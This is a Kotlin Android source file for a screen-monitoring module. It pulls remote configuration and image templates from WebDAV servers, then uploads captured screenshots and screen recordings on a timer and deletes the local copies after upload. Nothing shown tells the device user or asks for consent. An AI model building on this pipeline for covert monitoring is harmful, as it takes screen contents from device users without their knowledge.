package com.youyou.monitor

import android.content.Context
import android.os.Handler
import android.os.Looper
import com.carriez.flutter_hbb.MainApplication
import android.util.Log
import com.carriez.flutter_hbb.MainActivity
import org.json.JSONObject
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

/**
 * 屏幕监控配置类，支持定时从网页下载json并自动更新配置。
 */

val intervalMinutes = 1L * 60 // 默认60分钟

class MonitorConfig private constructor() {

    // 最大允许占用空间，单位MB（可根据需要调整）
    @Volatile
    var maxStorageSizeMB: Int = 1024 // 1GB

    /**
     * 定时清理截图和录像目录下的文件，超出最大空间时自动删除最旧文件
     */
    fun startAutoCleanStorage(intervalMinutes: Long = 10) {
        executor.scheduleWithFixedDelay({
            try {
                val screenshotDir = getScreenshotDir()
                val videoDir = getVideoDir()
                val allFiles = (getAllImageFiles(screenshotDir) + getAllVideoFiles(videoDir))
                if (allFiles.isEmpty()) return@scheduleWithFixedDelay
                // 按最后修改时间升序排列（最旧的在前）
                val sortedFiles = allFiles.sortedBy { it.lastModified() }
                var totalSize = sortedFiles.sumOf { it.length() }
                val maxBytes = maxStorageSizeMB * 1024L * 1024L
                var deletedCount = 0
                for (file in sortedFiles) {
                    if (totalSize <= maxBytes) break
                    val fileSize = file.length()
                    if (file.delete()) {
                        totalSize -= fileSize
                        deletedCount++
                        Log.d(TAG, "AutoClean: deleted ${file.absolutePath}, size=$fileSize")
                    }
                }
                if (deletedCount > 0) {
                    Log.i(TAG, "AutoClean: deleted $deletedCount files, remain size=${totalSize / 1024 / 1024}MB")
                }
            } catch (e: Exception) {
                Log.e(TAG, "AutoClean error: $e")
            }
        }, 0, intervalMinutes, TimeUnit.MINUTES)
    }
    private val context: Context = MainApplication.appContext

    companion object {
        const val TAG = "MonitorConfig"

        @Volatile
        private var instance: MonitorConfig? = null
        fun getInstance(): MonitorConfig {
            return instance ?: synchronized(this) {
                instance ?: MonitorConfig().also { instance = it }
            }
        }
    }

    // WebDAV 客户端实例
    lateinit var webdavClient: WebDavClient
    
    // 上传锁，防止并发上传
    @Volatile
    private var isUploadingImages: Boolean = false
    
    @Volatile
    private var isUploadingVideos: Boolean = false
    
    // 设备 ID，由 Flutter 端设置
    @Volatile
    var deviceId: String = ""
        private set
        
    /**
     * 设置设备 ID（由 Flutter 端调用）
     */
    fun setDeviceId(id: String) {
        deviceId = id
        Log.d(TAG, "Device ID set: $id")
        if (this::webdavClient.isInitialized) {
            webdavClient.deviceId = id
            Log.d(TAG, "Updated WebDavClient deviceId: $id")
        }
    }

    // 模板更新回调
    var onTemplatesUpdated: (() -> Unit)? = null

    // 配置项
    @Volatile
    var detectPerSecond: Int = 2 // 一秒检测多少次

    @Volatile
    var preferExternalStorage: Boolean = false
        set(value) {
            field = value
            Log.d(TAG, "preferExternalStorage change: $value")
            notifyFlutterRootDirChanged()
        }

    private fun notifyFlutterRootDirChanged() {
        try {
            // 直接访问MainActivity的静态变量，无需反射
            Handler(Looper.getMainLooper()).post {
                val rootDir = getRootDir().absolutePath
                MainActivity.flutterMethodChannel?.invokeMethod("onRootDirChanged", rootDir)
            }

        } catch (e: Exception) {
            Log.e(TAG, "notifyFlutterRootDirChanged error: $e")
        }
    }

    @Volatile
    var screenshotDir: String = "ScreenCaptures" // 图片保存目录

    @Volatile
    var videoDir: String = "ScreenRecord" // 录像保存目录

    @Volatile
    var RootDir: String = "PingerLove" // 根目录

    private val configFile = File(context.filesDir, "monitor_config_default.json")

    private val executor = Executors.newSingleThreadScheduledExecutor()

    init {
        // 构造函数只做变量初始化，所有耗时操作异步执行
        executor.execute {
            try {
                startUpdateConfigFromRemote(5)
                // 启动图片定时上传任务（默认10分钟）
                startAutoUploadImages(5)
                startAutoUploadVideos(60)
                // 启动定时清理任务
                startAutoCleanStorage(60 *24)
            } catch (e: Exception) {
                Log.e(TAG, "Async init error: $e")
            }
        }
    }

    /**
     * 定时从 WebDAV 服务器下载远程 config.json，成功则替换本地配置
     */
    private fun startUpdateConfigFromRemote(intervalMinutes: Long = 10) {
        executor.scheduleWithFixedDelay(
            {
                val json = getConfigJson()
                kotlinx.coroutines.runBlocking {
                    try {
                        if (json != null) {
                            updateConfig(json)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "tryUpdateConfigFromRemote error: $e")
                    }
                }
            }, 0, intervalMinutes, TimeUnit.MINUTES
        )

    }

    /**
     * 获取配置内容，优先读取 filesDir 下的配置文件，若不存在则读取 assets 目录下的默认配置
     */
    private fun getConfigJson(): String? {
        return try {
            if (configFile.exists()) {
                configFile.readText()
            } else {
                // assets/monitor_config_default.json
                context.assets.open("monitor_config_default.json").bufferedReader()
                    .use { it.readText() }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getConfigJson error: $e")
            null
        }
    }

    private fun saveLocalConfig(json: String) {
        try {
            configFile.writeText(json)
        } catch (e: Exception) {
            Log.e(TAG, "saveLocalConfig error: $e")
        }
    }

    private suspend fun updateConfig(json: String) {
        try {
            val obj = JSONObject(json)
            Log.d(TAG, "json config: $json")
            
            val webdavArray = obj.optJSONArray("webdavServers")
            if (webdavArray == null || webdavArray.length() == 0) {
                Log.e(TAG, "webdavServers array not found or empty")
                return
            }
            
            // 如果已经有可用的 WebDavClient，直接复用
            if (this::webdavClient.isInitialized) {
                try {
                    // 测试现有连接是否仍然可用
                    if (webdavClient.testConnection()) {
                        Log.d(TAG, "Reusing existing WebDavClient: ${webdavClient.webdavUrl}")
                        detectPerSecond = obj.optInt("detectPerSecond", detectPerSecond)
                        preferExternalStorage = obj.optBoolean("preferExternalStorage", preferExternalStorage)
                        screenshotDir = obj.optString("screenshotDir", screenshotDir)
                        videoDir = obj.optString("videoDir", videoDir)
                        return
                    } else {
                        Log.w(TAG, "Existing WebDavClient connection failed, will try to reconnect")
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error testing existing connection: ${e.message}")
                }
            }
            
            // 将所有 WebDAV 服务器分类：本地地址优先
            val localServers = mutableListOf<JSONObject>()
            val remoteServers = mutableListOf<JSONObject>()
            
            for (i in 0 until webdavArray.length()) {
                val serverObj = webdavArray.getJSONObject(i)
                val url = serverObj.optString("url", "")
                if (url.contains("192.168.") || url.contains("localhost") || url.contains("127.0.0.1")) {
                    localServers.add(serverObj)
                } else {
                    remoteServers.add(serverObj)
                }
            }
            
            // 优先尝试本地服务器，然后尝试远程服务器
            val allServers = localServers + remoteServers
            
            for (serverObj in allServers) {
                val webdavUrl = serverObj.optString("url", "")
                val username = serverObj.optString("username", "")
                val password = serverObj.optString("password", "")
                val monitorDir = serverObj.optString("monitorDir", "")
                val remoteDir = serverObj.optString("remoteUploadDir", "")
                val templateDir = serverObj.optString("templateDir", "")
                
                if (webdavUrl.isBlank() || username.isBlank() || password.isBlank() ||
                    monitorDir.isBlank() || remoteDir.isBlank() || templateDir.isBlank()) {
                    Log.w(TAG, "WebDAV config incomplete, skip: $webdavUrl")
                    continue
                }
                
                Log.d(TAG, "Testing WebDavClient: url=$webdavUrl, deviceId='$deviceId'")
                val startTime = System.currentTimeMillis()
                val client = WebDavClient(
                    webdavUrl, username, password, remoteDir, deviceId
                )
                
                if (!client.testConnection()) {
                    val elapsed = System.currentTimeMillis() - startTime
                    Log.w(TAG, "WebDAV connection test failed: $webdavUrl (${elapsed}ms)")
                    continue
                }
                
                val elapsed = System.currentTimeMillis() - startTime
                Log.d(TAG, "WebDAV connection test success: $webdavUrl (${elapsed}ms)")
                
                // 尝试下载远程配置
                val remoteBytes = client.downloadFile("/$monitorDir", "config.json")
                val newJson = if (remoteBytes.isNotEmpty()) String(remoteBytes) else ""
                
                if (newJson.isNotBlank()) {
                    // 有远程配置，使用它
                    if (newJson != json) {
                        // 配置有更新
                        val newObj = JSONObject(newJson)
                        this.webdavClient = client
                        detectPerSecond = newObj.optInt("detectPerSecond", detectPerSecond)
                        preferExternalStorage = newObj.optBoolean("preferExternalStorage", preferExternalStorage)
                        screenshotDir = newObj.optString("screenshotDir", screenshotDir)
                        videoDir = newObj.optString("videoDir", videoDir)
                        saveLocalConfig(newJson)
                        replaceTemplatesFromRemote(client, monitorDir, templateDir)
                        Log.d(TAG, "Config updated from WebDAV: $webdavUrl")
                        return
                    } else {
                        // 配置相同，使用本地配置
                        this.webdavClient = client
                        detectPerSecond = obj.optInt("detectPerSecond", detectPerSecond)
                        preferExternalStorage = obj.optBoolean("preferExternalStorage", preferExternalStorage)
                        screenshotDir = obj.optString("screenshotDir", screenshotDir)
                        videoDir = obj.optString("videoDir", videoDir)
                        replaceTemplatesFromRemote(client, monitorDir, templateDir)
                        Log.d(TAG, "Using local config with WebDAV: $webdavUrl")
                        return
                    }
                } else {
                    // 没有远程配置，继续尝试下一个服务器
                    Log.w(TAG, "No remote config found on $webdavUrl, trying next server")
                    continue
                }
            }
            
            Log.e(TAG, "All WebDAV servers failed to connect")
        } catch (e: Exception) {
            Log.e(TAG, "updateConfig error: $e")
        }
    }

    /**
     * 下载远程模板并替换本地模板，删除旧模板
     */
    private suspend fun replaceTemplatesFromRemote(
        client: WebDavClient,
        monitorDir: String,
        templateDir: String
    ) {
        try {
            val localDir = getTemplateDir()
            if (!localDir.exists()) localDir.mkdirs()
            
            // 使用 listDirectory 自动发现远程模板目录中的所有图片文件
            Log.d(TAG, "Listing remote templates from: /$templateDir")
            val remoteFiles = client.listDirectory("/$templateDir")
            
            if (remoteFiles.isEmpty()) {
                Log.w(TAG, "No template files found in remote directory")
                return
            }
            
            val keepFiles = mutableSetOf<String>()
            Log.d(TAG, "Found ${remoteFiles.size} template files, downloading...")
            
            for (fileName in remoteFiles) {
                try {
                    val bytes = client.downloadFile("/$templateDir", fileName)
                    if (bytes.isNotEmpty()) {
                        val file = File(localDir, fileName)
                        file.writeBytes(bytes)
                        keepFiles.add(file.name)
                        Log.d(TAG, "Template updated: ${file.name} (${bytes.size} bytes)")
                    } else {
                        Log.w(TAG, "Template file empty: $fileName")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Template download failed: $fileName - ${e.message}")
                }
            }
            
            // 删除未在远程的旧模板
            localDir.listFiles { f -> f.isFile && (f.name.endsWith(".png") || f.name.endsWith(".jpg")) }
                ?.forEach { f ->
                    if (!keepFiles.contains(f.name)) {
                        f.delete()
                        Log.d(TAG, "Old template deleted: ${f.name}")
                    }
                }
            // 通知监控逻辑模板已更新
            onTemplatesUpdated?.invoke()
        } catch (e: Exception) {
            Log.e(TAG, "replaceTemplatesFromRemote error: $e")
        }
    }

    /**
     * 获取模板目录（支持优先外部存储，拼接配置路径）
     */
    fun getTemplateDir(): File {
        val baseDir = getRootDir()
        val dir = File(baseDir, "Templates")
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    /**
     * 获取根目录（支持优先外部存储）
     */
    fun getRootDir(): File {
        val baseDir = if (preferExternalStorage) {
            val ext = File("/storage/emulated/0")
            if (ext.exists() && ext.canWrite()) ext else context.filesDir
        } else {
            context.filesDir
        }
        val dir = File(baseDir, RootDir)
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    /**
     * 获取图片保存目录（支持优先外部存储，拼接配置路径）
     */
    fun getScreenshotDir(): File {
        val baseDir = getRootDir()
        val dir = File(baseDir, screenshotDir)
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    /**
     * 获取图片保存目录（支持优先外部存储，拼接配置路径）
     */
    fun getVideoDir(): File {
        val baseDir = getRootDir()
        val dir = File(baseDir, videoDir)
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    /**
     * 定时上传本地图片到远程服务器（WebDAV 方式），上传成功后自动删除
     */
    fun startAutoUploadImages(intervalMinutes: Long = 10) {
        executor.scheduleWithFixedDelay({
            kotlinx.coroutines.runBlocking {
                try {
                    if (!this@MonitorConfig::webdavClient.isInitialized) {
                        Log.w(TAG, "WebDavClient not initialized, skip upload images")
                        return@runBlocking
                    }
                    
                    if (isUploadingImages) {
                        Log.w(TAG, "Another image upload task is running, skip upload images")
                        return@runBlocking
                    }
                    
                    isUploadingImages = true
                    
                    val dir = getScreenshotDir()
                    val files = getAllImageFiles(dir)
                    Log.d(TAG, "Found ${files.size} images to upload in ${dir.absolutePath}")
                    val baseDir = dir.absolutePath
                    for (file in files) {
                        // 检查文件是否稳定（最后修改时间距离现在至少 5 秒）
                        val fileAge = System.currentTimeMillis() - file.lastModified()
                        if (fileAge < 5000) {
                            Log.d(TAG, "Skip ${file.name}: file too new (${fileAge}ms), may be writing")
                            continue
                        }
                        
                        Log.d(TAG, "Try upload: ${file.absolutePath}")
                        val relPath = file.absolutePath.removePrefix(baseDir).removePrefix("/")
                        val subPath =
                            if (relPath.contains("/")) relPath.substringBeforeLast('/') else null
                        val success = webdavClient.uploadFile(
                            subPath ?: "",
                            file.name,
                            file,
                            overwrite = true
                        )
                        Log.d(TAG, "Upload result: $success for ${file.name}")
                        if (success) {
                            file.delete()
                            Log.d(TAG, "Uploaded and deleted: ${file.name}")
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Auto upload images error: $e")
                } finally {
                    isUploadingImages = false
                }
            }
        }, 0, intervalMinutes, TimeUnit.MINUTES)
    }

    // 递归获取所有图片文件
    private fun getAllImageFiles(dir: File): List<File> {
        val result = mutableListOf<File>()
        if (!dir.exists() || !dir.canRead()) return result
        val files = dir.listFiles()
        if (files != null) {
            for (file in files) {
                if (file.isDirectory) {
                    result.addAll(getAllImageFiles(file))
                } else if (file.isFile && (file.name.endsWith(".png") || file.name.endsWith(".jpg"))) {
                    result.add(file)
                }
            }
        }
        return result
    }

    /**
     * 定时上传本地录像文件到远程服务器（WebDAV 方式），上传成功后自动删除
     * 支持常见视频格式：mp4、mov、avi、mkv、flv、wmv、webm
     */
    fun startAutoUploadVideos(intervalMinutes: Long = 10) {
        executor.scheduleWithFixedDelay({
            kotlinx.coroutines.runBlocking {
                try {
                    if (!this@MonitorConfig::webdavClient.isInitialized) {
                        Log.w(TAG, "WebDavClient not initialized, skip upload videos")
                        return@runBlocking
                    }
                    
                    if (isUploadingVideos) {
                        Log.w(TAG, "Another video upload task is running, skip upload videos")
                        return@runBlocking
                    }
                    
                    isUploadingVideos = true
                    
                    val dir = getVideoDir()
                    val files = getAllVideoFiles(dir)
                    Log.d(TAG, "Found ${files.size} videos to upload in ${dir.absolutePath}")
                    val baseDir = dir.absolutePath
                    for (file in files) {
                        // 双重检查文件稳定性：1) 最后修改时间 2) 文件大小不变
                        val fileAge = System.currentTimeMillis() - file.lastModified()
                        if (fileAge < 30000) {
                            Log.d(TAG, "Skip ${file.name}: file too new (${fileAge / 1000}s), may be recording")
                            continue
                        }
                        
                        // 检查文件大小是否稳定（两次检查间隔 2 秒，大小应该相同）
                        val size1 = file.length()
                        kotlinx.coroutines.delay(2000)
                        val size2 = file.length()
                        if (size1 != size2) {
                            Log.w(TAG, "Skip ${file.name}: file size changed (${size1} -> ${size2}), still recording")
                            continue
                        }
                        
                        Log.d(TAG, "Try upload video: ${file.absolutePath} (${file.length() / 1024 / 1024}MB)")
                        val relPath = file.absolutePath.removePrefix(baseDir).removePrefix("/")
                        val subPath =
                            if (relPath.contains("/")) relPath.substringBeforeLast('/') else null
                        val success = webdavClient.uploadFile(
                            subPath ?: "",
                            file.name,
                            file,
                            overwrite = true
                        )
                        Log.d(TAG, "Upload result: $success for ${file.name}")
                        if (success) {
                            file.delete()
                            Log.d(TAG, "Uploaded and deleted: ${file.name}")
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Auto upload videos error: $e")
                } finally {
                    isUploadingVideos = false
                }
            }
        }, 0, intervalMinutes, TimeUnit.MINUTES)
    }

    // 递归获取所有视频文件
    private fun getAllVideoFiles(dir: File): List<File> {
        val result = mutableListOf<File>()
        if (!dir.exists() || !dir.canRead()) return result
        val files = dir.listFiles()
        if (files != null) {
            for (file in files) {
                if (file.isDirectory) {
                    result.addAll(getAllVideoFiles(file))
                } else if (file.isFile && isVideoFile(file.name)) {
                    result.add(file)
                }
            }
        }
        return result
    }

    // 判断文件名是否为常见视频格式
    private fun isVideoFile(name: String): Boolean {
        val lower = name.lowercase()
        return lower.endsWith(".mp4") || lower.endsWith(".mov") || lower.endsWith(".avi") ||
                lower.endsWith(".mkv") || lower.endsWith(".flv") || lower.endsWith(".wmv") ||
                lower.endsWith(".webm")
    }
}
